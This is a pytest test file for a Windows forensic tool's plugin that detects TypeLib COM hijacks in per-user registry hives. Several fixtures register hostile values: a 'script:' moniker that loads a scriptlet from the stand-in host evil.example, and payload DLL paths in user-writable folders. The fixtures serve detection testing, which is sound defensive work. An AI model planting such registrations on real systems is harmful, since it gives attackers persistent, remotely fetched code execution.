"""Tests for TypeLib COM hijacks in per-user class registrations (T1546.015)."""

from __future__ import annotations

from typing import TYPE_CHECKING

from pyrsistencesniper.core.models import (
    AccessLevel,
    Finding,
    Severity,
    UserProfile,
)
from pyrsistencesniper.core.profile import DetectionProfile
from pyrsistencesniper.plugins.T1546.typelib_hijack import TypeLibHijack

from .conftest import make_node, make_plugin, make_user_profiles, setup_usrclass

if TYPE_CHECKING:
    from pathlib import Path


def _victim_plugin(tmp_path: Path) -> object:
    """Build the plugin over one profile whose UsrClass.dat was collected."""
    return make_plugin(
        TypeLibHijack, tmp_path, user_profiles=make_user_profiles("victim")
    )


def _typelib_tree(
    guid: str,
    version: str,
    platform: str,
    target: str,
    lcid: str = "0",
) -> object:
    """Build a TypeLib subtree with one registered library path."""
    platform_node = make_node(name=platform, values={"(Default)": target})
    lcid_node = make_node(name=lcid, children={platform: platform_node})
    version_node = make_node(name=version, children={lcid: lcid_node})
    guid_node = make_node(name=guid, children={version: version_node})
    return make_node(children={guid: guid_node})


def _classify(finding: Finding) -> Severity:
    """Classify a finding with the shipped profile, as a real scan would."""
    return DetectionProfile.load(None).policy_for("typelib_hijack").classify(finding)


def test_script_moniker_flagged(tmp_path: Path) -> None:
    """A script: moniker registered as a type library is reported."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {
            "TypeLib": _typelib_tree(
                "{evil-guid}", "1.0", "win32", "script:http://evil.example/a.sct"
            )
        },
    )

    findings = plugin.run()

    assert len(findings) == 1
    assert findings[0].path == (
        r"HKU\victim\Software\Classes\TypeLib\{evil-guid}\1.0\0\win32"
    )
    assert "script:" in findings[0].value
    assert findings[0].access_gained is AccessLevel.USER


def test_user_writable_path_flagged(tmp_path: Path) -> None:
    """A type library outside the system directories is reported."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {
            "TypeLib": _typelib_tree(
                "{other-guid}", "2.0", "win64", r"C:\Users\victim\evil.tlb"
            )
        },
    )

    assert len(plugin.run()) == 1


def test_system_path_still_reported(tmp_path: Path) -> None:
    """A system directory in the path is not a reason to drop the registration."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {
            "TypeLib": _typelib_tree(
                "{ok-guid}", "1.0", "win32", r"C:\Windows\System32\stdole2.tlb"
            )
        },
    )

    assert len(plugin.run()) == 1


def test_world_writable_directory_named_program_files_flagged(tmp_path: Path) -> None:
    """A path containing "\\Program Files\\" is not proof it is under Program Files."""
    plugin = _victim_plugin(tmp_path)
    payload = r"C:\Users\Public\Program Files\payload.dll"
    setup_usrclass(plugin, {"TypeLib": _typelib_tree("{g}", "2.0", "win32", payload)})

    assert [finding.value for finding in plugin.run()] == [payload]


def test_signed_system_library_stays_quiet_in_the_profile() -> None:
    """A Microsoft-signed type library is suppressed by the profile, not by run()."""
    finding = Finding(
        path=r"HKU\victim\Software\Classes\TypeLib\{g}\1.0\0\win32",
        value=r"%SystemRoot%\System32\stdole2.tlb",
        check_id="typelib_hijack",
        signer="Microsoft Windows",
    )

    assert _classify(finding) < Severity.MEDIUM


def test_unsigned_library_in_a_system_path_reaches_medium() -> None:
    """An unsigned payload under a world-writable system subdirectory is reported."""
    finding = Finding(
        path=r"HKU\victim\Software\Classes\TypeLib\{g}\1.0\0\win32",
        value=r"C:\Windows\System32\spool\drivers\color\payload.dll",
        check_id="typelib_hijack",
        signer="",
    )

    assert _classify(finding) >= Severity.MEDIUM


def test_non_zero_lcid_registration_flagged(tmp_path: Path) -> None:
    """A registration under a localised LCID subkey is read, not just LCID 0."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {
            "TypeLib": _typelib_tree(
                "{g}", "2.0", "win32", r"C:\Users\victim\evil.dll", lcid="409"
            )
        },
    )

    findings = plugin.run()

    assert len(findings) == 1
    assert findings[0].path == (
        r"HKU\victim\Software\Classes\TypeLib\{g}\2.0\409\win32"
    )


def test_reads_the_hive_root_not_a_software_classes_prefix(tmp_path: Path) -> None:
    """The key asked for is TypeLib: UsrClass.dat's root is the classes key."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {
            r"Software\Classes\TypeLib": _typelib_tree(
                "{evil-guid}", "1.0", "win32", "script:http://evil.example/a.sct"
            )
        },
    )

    assert plugin.run() == []


# Without stripping the trailing resource number the path matches nothing on
# disk and the signer stays empty.
def test_embedded_library_resolves_to_the_image_file(tmp_path: Path) -> None:
    """A type library embedded in a PE names the image, not the resource index."""
    plugin = _victim_plugin(tmp_path)
    registered = r"C:\Users\victim\AppData\Local\Microsoft\OneDrive\OneDrive.exe\1"
    setup_usrclass(
        plugin, {"TypeLib": _typelib_tree("{g}", "1.0", "win32", registered)}
    )

    findings = plugin.run()

    assert findings[0].value == registered
    assert findings[0].resolve_target == (
        r"C:\Users\victim\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
    )


def test_environment_variable_expanded_for_resolution(tmp_path: Path) -> None:
    """An unexpanded path resolves to nothing, so the signer would read as empty."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {
            "TypeLib": _typelib_tree(
                "{g}", "1.0", "win32", r"%SystemRoot%\System32\stdole2.tlb"
            )
        },
    )

    findings = plugin.run()

    assert findings[0].value == r"%SystemRoot%\System32\stdole2.tlb"
    assert findings[0].resolve_target == r"Windows\System32\stdole2.tlb"


def test_user_environment_variable_expanded_for_the_owning_profile(
    tmp_path: Path,
) -> None:
    """A per-user variable expands against the profile the hive belongs to."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {"TypeLib": _typelib_tree("{g}", "1.0", "win32", r"%LOCALAPPDATA%\evil.dll")},
    )

    assert plugin.run()[0].resolve_target == (r"Users\victim\AppData\Local\evil.dll")


def test_script_moniker_has_no_file_to_resolve(tmp_path: Path) -> None:
    """A script: moniker is not a path, so nothing is claimed to be on disk."""
    plugin = _victim_plugin(tmp_path)
    setup_usrclass(
        plugin,
        {
            "TypeLib": _typelib_tree(
                "{g}", "1.0", "win32", "script:http://evil.example/a.sct"
            )
        },
    )

    assert plugin.run()[0].resolve_target == ""


def test_plain_library_path_resolves_unchanged(tmp_path: Path) -> None:
    """A standalone .tlb path carries no resource index to strip."""
    plugin = _victim_plugin(tmp_path)
    library = r"C:\Users\victim\AppData\Local\evil.tlb"
    setup_usrclass(plugin, {"TypeLib": _typelib_tree("{g}", "1.0", "win32", library)})

    assert plugin.run()[0].resolve_target == library


def test_no_users_returns_empty(tmp_path: Path) -> None:
    """An image with no user profiles produces no findings."""
    assert make_plugin(TypeLibHijack, tmp_path).run() == []


def test_profile_without_usrclass_is_skipped(tmp_path: Path) -> None:
    """A profile whose UsrClass.dat was never collected is passed over."""
    profile = UserProfile(
        username="victim",
        profile_path=tmp_path / "Users" / "victim",
        ntuser_path=tmp_path / "NTUSER.DAT",
    )
    plugin = make_plugin(TypeLibHijack, tmp_path, user_profiles=[profile])
    setup_usrclass(plugin, {"TypeLib": _typelib_tree("{g}", "1.0", "win32", "x.tlb")})

    assert plugin.run() == []
